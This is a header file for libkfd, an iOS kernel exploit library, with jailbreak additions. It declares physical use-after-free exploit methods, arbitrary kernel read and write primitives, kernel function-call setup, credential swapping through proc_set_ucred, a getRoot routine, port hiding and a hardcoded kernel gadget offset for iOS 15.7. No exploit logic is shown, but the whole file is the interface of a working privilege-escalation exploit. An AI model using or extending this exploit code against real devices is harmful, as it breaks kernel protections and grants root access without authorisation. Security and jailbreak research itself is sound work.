/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef libkfd_h
#define libkfd_h

/*
 * The global configuration parameters of libkfd.
 */
#define CONFIG_ASSERT 1
#define CONFIG_PRINT 1
#define CONFIG_TIMER 1

// to make clang stfu about `Pointer is missing a nullability type specifier`
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wnullability-completeness"

#include "libkfd/common.h"
#import <Foundation/Foundation.h>
#include "kalloc.h"


#include <mach/mach.h>
#include <mach/mach_time.h>

/*
 * The public API of libkfd.
 */

typedef NS_ENUM(NSUInteger, puaf_method) {
    puaf_physpuppet,
    puaf_smith,
};

typedef NS_ENUM(NSUInteger, kread_method) {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
    kread_IOSurface,
};

typedef NS_ENUM(NSUInteger, kwrite_method) {
    kwrite_dup,
    kwrite_sem_open,
    kwrite_IOSurface,
};

u64 kopen(u64 puaf_pages, puaf_method puaf_method, kread_method kread_method, kwrite_method kwrite_method);

// NOTE: THESE 2 FUNCTIONS BELOW
// KREAD AND KWRITE
// THESE UNDERSCORE PREFIXED ONES ARE NOW DEPRECATED
// USE THE ONES FROM TIHMSTAR'S KERNRW INSTEAD
void _kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
void _kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);

void kclose(u64 kfd);

/*
 * The private API of libkfd.
 */

struct kfd; // Forward declaration for function pointers.

struct info {
    struct {
        vm_address_t src_uaddr;
        vm_address_t dst_uaddr;
        vm_size_t size;
    } copy;
    struct {
        i32 pid;
        u64 tid;
        u64 vid;
        bool ios;
        char osversion[8];
        u64 maxfilesperproc;
    } env;
    struct {
        u64 kernel_slide;
        u64 gVirtBase;
        u64 gPhysBase;
        u64 gPhysSize;
        struct {
            u64 pa;
            u64 va;
        } ttbr[2];
        struct ptov_table_entry {
            u64 pa;
            u64 va;
            u64 len;
        } ptov_table[8];

        u64 current_map;
        u64 current_pmap;
        u64 current_proc;
        u64 current_task;
        u64 current_thread;
        u64 current_uthread;
        u64 kernel_map;
        u64 kernel_pmap;
        u64 kernel_proc;
        u64 kernel_task;
    } kernel;
};

struct perf {
    u64 kernelcache_index;
    struct {
        u64 kaddr;
        u64 paddr;
        u64 uaddr;
        u64 size;
    } shared_page;
    struct {
        i32 fd;
        u32 si_rdev_buffer[2];
        u64 si_rdev_kaddr;
    } dev;
    void (*saved_kread)(struct kfd*, u64, void*, u64);
    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
};

struct puaf {
    u64 number_of_puaf_pages;
    u64* puaf_pages_uaddr;
    void* puaf_method_data;
    u64 puaf_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*run)(struct kfd*);
        void (*cleanup)(struct kfd*);
        void (*free)(struct kfd*);
    } puaf_method_ops;
};

struct krkw {
    u64 krkw_maximum_id;
    u64 krkw_allocated_id;
    u64 krkw_searched_id;
    u64 krkw_object_id;
    u64 krkw_object_uaddr;
    u64 krkw_object_size;
    void* krkw_method_data;
    u64 krkw_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*allocate)(struct kfd*, u64);
        bool (*search)(struct kfd*, u64);
        void (*kread)(struct kfd*, u64, void*, u64);
        void (*kwrite)(struct kfd*, void*, u64, u64);
        void (*find_proc)(struct kfd*);
        void (*deallocate)(struct kfd*, u64);
        void (*free)(struct kfd*);
    } krkw_method_ops;
};

struct kfd {
    struct info info;
    struct perf perf;
    struct puaf puaf;
    struct krkw kread;
    struct krkw kwrite;
};

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"

NSUserDefaults *_Nonnull appDefaults(void) {
    static NSUserDefaults *def;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        NSMutableString *mut = [NSMutableString stringWithString:@(getenv("HOME"))];
        [mut appendString:@"/Library/Preferences/com.serena.kfdJb.plist"];
        def = [[NSUserDefaults alloc] initWithSuiteName:mut];
    });
    
    return def;
}

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);

void kfd_free(struct kfd* kfd);

uint64_t kernel_slide = 0;
uint64_t current_proc = 0;
u64 kopen(u64 puaf_pages, puaf_method puaf_method, kread_method kread_method, kwrite_method kwrite_method);

void _kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);

void _kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);

void kclose(u64 kfd);

// BEGIN MINEEK CHANGES
#include "IOKit.h"
#include "mineekpf.h"

mach_port_t user_client = 0;
uint64_t fake_client = 0;

uint64_t add_x0_x0_0x40_ret_func = 0;
uint64_t proc_set_ucred_func = 0;

uint32_t _kread32(u64 kfd, uint64_t where);

uint64_t _kread64(u64 kfd, uint64_t where);

void _kwrite32(u64 kfd, uint64_t where, uint32_t what);

void _kwrite64(u64 kfd, uint64_t where, uint64_t what);

void kreadbuf(uint64_t kfd, uint64_t kaddr, void* output, size_t size);

size_t kwritebuf(uint64_t kfd, uint64_t where, const void *p, size_t size);

uint64_t find_port(u64 kfd, mach_port_name_t port, u64 task_addr);

void show_port(u64 kfd, mach_port_name_t port, u64 task_addr, u64 orig);

uint64_t hide_port(u64 kfd, mach_port_name_t port, u64 task_addr);


// FIXME: Currently just finds a zerobuf in memory, this can be overwritten at ANY time, and thus is really unstable and unreliable. Once you get the unstable kcall, use that to bootstrap a stable kcall primitive, not using dirty_kalloc.
uint64_t dirty_kalloc(u64 kfd, size_t size);

static uint64_t off_ipc_port_ip_kobject_151 = 0x58;
static uint64_t off_ipc_port_ip_kobject_152 = 0x48;

uint64_t kcall_kfd = 0;

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6);

uint64_t kcall6_nox0_offset = 0xfffffff00778e9cc; // br x6, iP7 15.7
void kcall6_nox0_raw_init(uint64_t fakeclient);

mach_port_t krw_client = 0;
uint64_t kcall_6_nox0(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5);

uint64_t init_kcall_remote(u64 kfd, u64 task_addr, mach_port_t user_client);

void init_kcall(u64 kfd, u64 task_addr);

uint64_t proc_of_pid(u64 kfd, pid_t pid);

void getRoot(u64 kfd, uint64_t proc_addr);

uint64_t ldr_w0_x2_x1 = 0;
uint64_t str_w1_x2 = 0;

typedef u64 (*find_offset_func)(struct kfd *kfd);

u64 find_or_set_offset(char *name, find_offset_func func, struct kfd *kfd, bool allowCache);

void init_offsets(struct kfd *kfd);

void stage2(u64 kfd);

#define HEXDUMP_COLS 16

void hexdump(void *mem, unsigned int len);

#pragma clang diagnostic pop /* "-Wnullability-completeness" */

#endif /* libkfd_h */
